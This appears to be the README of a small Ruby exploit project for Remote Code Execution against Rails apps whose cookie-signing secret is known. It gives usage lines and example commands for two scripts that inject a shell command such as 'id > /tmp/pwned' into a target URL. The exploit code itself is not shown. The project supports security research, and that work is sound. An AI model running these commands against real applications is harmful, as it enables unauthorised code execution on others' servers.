# Rails - Known Secret Session Cookie Remote Code Execution
If you happen to know the secret_token (Rails 2&3) or secret_key_base (Rails 4) which is used to encrypt cookies in Rails, you can perform a Remote Code Execution. There are exploits on Metasploit and Exploit DB, but they did not work for me. I decided to code this exploit in Ruby. There are 2 files: `rails_3.rb` & `rails_4.rb`. This is my primitive approach in trying to understand how deserialization of a crafted Ruby Object works.

**Rails 2 & 3** 
* * *
    Usage: ruby rails_3.rb --url <rails-application-url> --payload '<cmd>' --secret <secret>
    Example: ruby rails_3.rb --url https://127.0.0.1/myapp/ --payload 'id > /tmp/pwned' --secret 64454584dd1dd6abfed6342cc66281fb
* * *

**Rails 4**
* * *
    Usage: ruby rails_4.rb --url <rails-application-url> --payload '<cmd>' --secret <secret>
    Example: ruby rails_4.rb --url https://127.0.0.1/myapp/ --payload 'id > /tmp/pwned' --secret 64454584dd1dd6abfed6342cc66281fb
* * *


